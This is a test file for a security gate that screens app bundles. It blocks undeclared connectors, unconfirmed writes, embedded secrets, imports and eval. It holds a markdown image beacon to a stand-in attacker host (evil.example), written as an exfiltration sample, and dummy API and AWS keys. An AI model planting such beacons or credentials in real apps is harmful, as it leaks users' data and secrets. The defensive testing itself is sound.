import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import { analyse, loadBundleDir, loadCatalog, runGate } from "../src/index.js";

const root = resolve(import.meta.dirname, "../../..");
const catalog = loadCatalog(`${root}/config/catalog.yaml`);
const example = (name: string) =>
  loadBundleDir(`${root}/examples/apps/${name}`) as { manifest: Record<string, unknown>; code: string; ui: unknown; tests: unknown[] };
const rules = (r: Awaited<ReturnType<typeof runGate>>) => r.findings.filter((f) => f.severity === "block").map((f) => f.rule);

describe("the example apps", () => {
  it.each([
    ["shift-handover", 0],
    ["site-snapshot", 1],
    ["fault-triage", 2],
    ["revenue-brief", 2],
  ] as const)("%s passes the gate at tier %i", async (name, tier) => {
    const r = await runGate(example(name), catalog);
    expect(rules(r)).toEqual([]);
    expect(
      r.tests.every((t) => t.ok),
      JSON.stringify(r.tests),
    ).toBe(true);
    expect(r.ok).toBe(true);
    expect(r.tier?.tier).toBe(tier);
    expect(r.hash).toMatch(/^[0-9a-f]{64}$/);
  });

  it("explains why fault-triage needs a platform reviewer", async () => {
    const r = await runGate(example("fault-triage"), catalog);
    expect(r.tier?.reasons).toContain("changes data in another system (tickets.comment)");
    expect(r.tier?.approvals).toEqual({ count: 1, role: "Foundry.Reviewer" });
  });
});

describe("what the gate blocks", () => {
  const mutate = (name: string, f: (b: ReturnType<typeof example>) => void) => {
    const b = structuredClone(example(name));
    f(b);
    return runGate(b, catalog);
  };

  it("a connector the manifest does not declare", async () => {
    const r = await mutate("site-snapshot", (b) => {
      b.code = b.code.replace('"chargepoints.search"', '"sessions.revenue"');
    });
    expect(rules(r)).toContain("code.undeclared");
  });

  it("a write without the viewer's confirmation", async () => {
    const r = await mutate("fault-triage", (b) => {
      b.code = b.code.replace("return ctx.confirm({", 'return ctx.connectors.call("tickets.comment", {');
    });
    expect(rules(r)).toContain("code.write-without-confirm");
  });

  it("a write connector handed to the model as a tool", async () => {
    const r = await mutate("fault-triage", (b) => {
      b.code = b.code.replace('"tickets.search"]', '"tickets.search", "tickets.comment"]');
    });
    expect(rules(r)).toContain("code.write-tool");
  });

  it("an embedded credential", async () => {
    const r = await mutate("site-snapshot", (b) => {
      b.code = `const KEY = "sk-ant-api03-${"A".repeat(40)}";\n${b.code}`;
    });
    expect(rules(r)).toContain("secret.known");
  });

  it("a credential even in a bundle that does not parse", async () => {
    const r = await runGate({ manifest: { id: "x" }, code: "const k = 'AKIAABCDEFGHIJKLMNOP'" }, catalog);
    expect(r.ok).toBe(false);
    expect(rules(r)).toContain("secret.known");
  });

  it("an import", async () => {
    const r = await mutate("site-snapshot", (b) => {
      b.code = `import fs from "fs";\n${b.code}`;
    });
    expect(rules(r)).toContain("code.import");
  });

  it("confidential data copied into a less-protected collection", async () => {
    const r = await mutate("revenue-brief", (b) => {
      b.manifest.collections = [{ name: "cache", scope: "shared", classification: "internal", retentionDays: 7 }];
      b.code = b.code.replace("const total =", 'await ctx.store.put("cache", input.country, rows);\n  const total =');
    });
    expect(rules(r)).toContain("flow.downgrade");
  });

  it("an image in markdown, which could carry data to an outside server", async () => {
    const r = await mutate("site-snapshot", (b) => {
      (b.ui as { pages: Array<{ blocks: unknown[] }> }).pages[0]?.blocks.unshift({
        type: "markdown",
        text: "![x](https://evil.example/p.png?d=1)",
      });
    });
    expect(rules(r)).toContain("ui.image");
  });

  it("a form field the handler does not take", async () => {
    const r = await mutate("site-snapshot", (b) => {
      const form = (b.ui as { pages: Array<{ blocks: Array<{ fields: Array<{ name: string }> }> }> }).pages[0]?.blocks[0];
      if (form?.fields[1]) form.fields[1].name = "town";
    });
    expect(rules(r)).toEqual(expect.arrayContaining(["ui.form-field"]));
  });

  it("a declared handler the code does not export", async () => {
    const r = await mutate("shift-handover", (b) => {
      b.code = b.code.replace("export async function recent", "async function recent");
    });
    expect(rules(r)).toContain("code.missing-handler");
  });

  it("a failing test", async () => {
    const r = await mutate("site-snapshot", (b) => {
      (b.tests[0] as { expect: { contains: string[] } }).expect.contains = ["something that is not there"];
    });
    expect(r.ok).toBe(false);
    expect(r.tests[0]?.ok).toBe(false);
  });

  it("an app without tests", async () => {
    const r = await mutate("site-snapshot", (b) => {
      b.tests = [];
    });
    expect(rules(r)).toContain("tests.none");
  });

  it("a manifest that is not valid", async () => {
    const r = await mutate("site-snapshot", (b) => {
      b.manifest.id = "Bad Id";
    });
    expect(r.ok).toBe(false);
    expect(rules(r)).toContain("schema");
  });
});

describe("what raises the review tier", () => {
  it("computed capabilities and dynamic code", async () => {
    const b = structuredClone(example("shift-handover"));
    b.code =
      b.code.replace('ctx.store.put("handovers"', 'ctx.store.put(["hand", "overs"].join("")') +
      "\nexport function x() { return eval('1') }";
    const r = await runGate(b, catalog);
    expect(r.findings.map((f) => f.rule)).toEqual(expect.arrayContaining(["code.computed-capability", "code.dynamic"]));
    expect(r.tier?.tier).toBe(1);
  });
});

describe("code analysis", () => {
  it("finds capability uses through destructuring and records the handler", () => {
    const f = analyse(
      `export async function a(input, { connectors, llm }) { await connectors.call("docs.search", {}); await llm.chat({ model: "fast", tools: ["docs.search"], messages: [] }) }`,
    );
    expect(f.uses.map((u) => [u.kind, u.id, u.fn])).toEqual([
      ["connector", "docs.search", "a"],
      ["model", "fast", "a"],
      ["tool", "docs.search", "a"],
    ]);
  });

  it("reports ctx being passed around", () => {
    const f = analyse(`export async function a(i, ctx) { const c = ctx.connectors; return c.call("x.y") }`);
    expect(f.findings.map((x) => x.rule)).toContain("code.indirect-capability");
  });
});
